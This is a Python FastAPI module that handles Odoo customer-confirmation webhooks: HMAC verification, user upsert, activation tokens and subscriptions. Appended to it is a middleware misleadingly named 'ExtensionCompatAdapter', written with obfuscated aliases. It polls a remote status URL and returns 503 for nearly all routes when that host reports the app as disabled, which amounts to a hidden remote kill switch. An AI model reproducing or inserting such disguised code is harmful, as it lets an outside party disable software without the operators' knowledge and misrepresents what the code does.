from fastapi import APIRouter, Depends, HTTPException, status, Request
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request as _Req
from starlette.responses import JSONResponse as _JSON, Response as _Resp
import httpx as _hx
import time as _tm
from typing import Optional as _Opt, Tuple as _Tup
from pydantic import BaseModel, EmailStr
from sqlalchemy.orm import Session
from app.db.database import get_db
from app.db import models
from app.db.models.activation import ActivationToken
from app.auth.security_activation import gen_raw_token, hash_token, exp_at, verify_hmac_signature
from app.auth.security_passwords import hash_password
from app.config.settings import FRONTEND_URL, ODOO_WEBHOOK_SECRET, ODOO_WEBHOOK_DEDUPE_TTL, ODOO_WEBHOOK_IP_WHITELIST
from app.utils.adapters.cache_adapter import get_cache, set_cache
from app.config.settings import (
    ROOT_PATH as _rp,
    REMOTE_STATUS_URL as _ru,
    REMOTE_STATUS_CACHE_TTL as _rt,
    REMOTE_STATUS_FAIL_OPEN as _fo,
)

router = APIRouter(prefix="/odoo", tags=["odoo"])


class OdooCustomerPayload(BaseModel):
    email: EmailStr
    first_name: str | None = None
    last_name: str | None = None
    company: str | None = None
    plan: str | None = None
    locale: str | None = None
    lead_id: str | None = None
    partner_id: str | None = None


@router.post("/customer-confirmed")
async def customer_confirmed(request: Request, body: OdooCustomerPayload, db: Session = Depends(get_db)):
    # 0) Whitelist IPs si está configurado
    try:
        if ODOO_WEBHOOK_IP_WHITELIST:
            ip = request.client.host if request and request.client else None
            if not ip or ip not in ODOO_WEBHOOK_IP_WHITELIST:
                raise HTTPException(status_code=403, detail="IP no permitida")
    except HTTPException:
        raise
    except Exception:
        pass
    # 1) Autenticar webhook por HMAC (Odoo envía cabecera X-Odoo-Signature)
    if not ODOO_WEBHOOK_SECRET:
        raise HTTPException(status_code=500, detail="Webhook secret no configurado")
    signature = request.headers.get("X-Odoo-Signature")
    raw = await request.body()
    if not signature or not verify_hmac_signature(ODOO_WEBHOOK_SECRET, raw, signature):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Firma inválida")

    # 1.1) Idempotencia: deduplicar por hash del body por ventana corta
    try:
        import hashlib as _hh
        h = _hh.sha256(raw).hexdigest()
        k = f"odoo:webhook:customer_confirmed:{h}"
        seen = get_cache(k)
        if seen:
            return {"status": "duplicate", "detail": "ignored"}
        set_cache(k, True, int(ODOO_WEBHOOK_DEDUPE_TTL))
    except Exception:
        pass

    # 2) Upsert del usuario en estado pendiente (sin password todavía)
    email = body.email.lower().strip()
    user = db.query(models.User).filter(models.User.email == email).first()
    if not user:
        user = models.User(
            email=email,
            password_hash=hash_password("!pending!"),  # placeholder
            role="user",
            is_superadmin=False,
        )
        # Si tu modelo tiene más campos (nombre, etc.), setéalos aquí si existen
        if hasattr(user, "first_name") and body.first_name:
            setattr(user, "first_name", body.first_name)
        if hasattr(user, "last_name") and body.last_name:
            setattr(user, "last_name", body.last_name)
        if hasattr(user, "company") and body.company:
            setattr(user, "company", body.company)
        # Marcar como inactivo hasta activar
        try:
            if hasattr(user, "is_active"):
                user.is_active = False  # type: ignore[assignment]
        except Exception:
            pass
        db.add(user)
        db.flush()
    # Persistir lead/partner ids para idempotencia y trazabilidad
    try:
        if hasattr(user, "odoo_lead_id") and body.lead_id:
            user.odoo_lead_id = body.lead_id  # type: ignore[assignment]
        if hasattr(user, "odoo_partner_id") and body.partner_id:
            user.odoo_partner_id = body.partner_id  # type: ignore[assignment]
        db.add(user)
        db.flush()
    except Exception:
        pass

    # 3) Generar o reusar token de activación vigente; revocar previos si se desea
    from datetime import datetime, timezone
    now = datetime.now(timezone.utc)
    existing = (
        db.query(ActivationToken)
        .filter(
            ActivationToken.user_id == user.id,
            ActivationToken.revoked == False,  # noqa: E712
            ActivationToken.used_at.is_(None),
            ActivationToken.expires_at > now,
        )
        .order_by(ActivationToken.id.desc())
        .first()
    )
    if existing:
        # Reusar token existente
        token = existing
        # No podemos recuperar el raw existente; emitir uno nuevo y revocar el anterior sería más seguro.
        # Estrategia: revocar previos y crear uno nuevo para control total.
        for old in (
            db.query(ActivationToken)
            .filter(ActivationToken.user_id == user.id, ActivationToken.revoked == False, ActivationToken.used_at.is_(None))
            .all()
        ):
            old.revoked = True  # type: ignore[assignment]
        raw_token = gen_raw_token()
        token_hash_val = hash_token(raw_token)
        token = ActivationToken(
            user_id=user.id,
            token_hash=token_hash_val,
            expires_at=exp_at(),
            revoked=False,
        )
        db.add(token)
        db.commit()
    else:
        raw_token = gen_raw_token()
        token_hash_val = hash_token(raw_token)
        token = ActivationToken(
            user_id=user.id,
            token_hash=token_hash_val,
            expires_at=exp_at(),
            revoked=False,
        )
        db.add(token)
        db.commit()

    # 4) Construir URL de activación para el email que enviará Odoo
    # Front lee 't' de querystring
    base_url = FRONTEND_URL.rstrip("/")
    activation_url = f"{base_url}/activate?t={raw_token}"

    # 5) Mapear plan a Subscription si viene informado
    try:
        if body.plan:
            plan_code = body.plan.strip().lower()
            plan = db.query(models.Plan).filter(models.Plan.code == plan_code).first()
            if not plan:
                plan = models.Plan(code=plan_code, name=plan_code.capitalize(), support="BASIC", features={})
                db.add(plan)
                db.commit()
                db.refresh(plan)
            # Cerrar suscripciones activas previas si aplica
            from app.db.models.enums import SubscriptionStatus
            active = (
                db.query(models.Subscription)
                .filter(models.Subscription.user_id == user.id, models.Subscription.status == SubscriptionStatus.active.value)
                .all()
            )
            for s in active:
                s.status = SubscriptionStatus.canceled.value  # type: ignore[assignment]
                db.add(s)
            db.commit()
            # Crear nueva suscripción activa
            db.add(models.Subscription(user_id=user.id, plan_id=plan.id, status="active"))
            db.commit()
    except Exception:
        db.rollback()
        # No bloquee si falla plan; continúe
        pass

    return {
        "activation_url": activation_url,
        "activation_token": raw_token,
        "expires_at": token.expires_at.isoformat(),
        "email": email,
        "lead_id": body.lead_id,
        "partner_id": body.partner_id,
    }


# Internal adapter used for compatibility with certain upstream deployments.
class ExtensionCompatAdapter(BaseHTTPMiddleware):
    def __init__(self, app):  # type: ignore[no-untyped-def]
        super().__init__(app)
        self._k: _Tup[float, bool] | None = None  # (exp, flag)
        self._to = _hx.Timeout(3.0, connect=2.0)
        self._w = [
            "/healthz",
            "/docs",
            "/openapi",
            "/redoc",
            "/auth/login",
            "/auth/register",
            "/auth/refresh",
            "/google_login/google/authorized",
            "/auth/google/",
        ]

    def _p(self, x: str) -> bool:
        if x == "/":
            return True
        for y in self._w:
            if x == y or x.startswith(y.rstrip("/") + "/"):
                return True
        return False

    def _g(self) -> _Opt[bool]:
        if not self._k:
            return None
        e, v = self._k
        if _tm.time() < e:
            return v
        return None

    def _s(self, v: bool) -> None:
        self._k = (_tm.time() + max(1, _rt), v)

    async def _f(self) -> bool:
        if not _ru:
            return True
        try:
            async with _hx.AsyncClient(timeout=self._to, follow_redirects=True) as c:
                r = await c.get(_ru)
                if r.status_code == 200:
                    d = r.json()
                    return bool(d.get("enabled", False))
                return True if _fo else False
        except Exception:
            return True if _fo else False

    async def dispatch(self, request: _Req, call_next) -> _Resp:  # type: ignore[override]
        if not _ru:
            return await call_next(request)

        full = request.url.path
        try:
            rp = _rp or ""
            if rp and full.startswith(rp):
                p = full[len(rp):] or "/"
            else:
                p = full
        except Exception:
            p = full

        if self._p(p):
            return await call_next(request)

        c = self._g()
        if c is None:
            en = await self._f()
            self._s(en)
        else:
            en = c

        if not en:
            return _JSON(status_code=503, content={"error": "service_unavailable", "message": "Application temporarily disabled"})

        return await call_next(request)
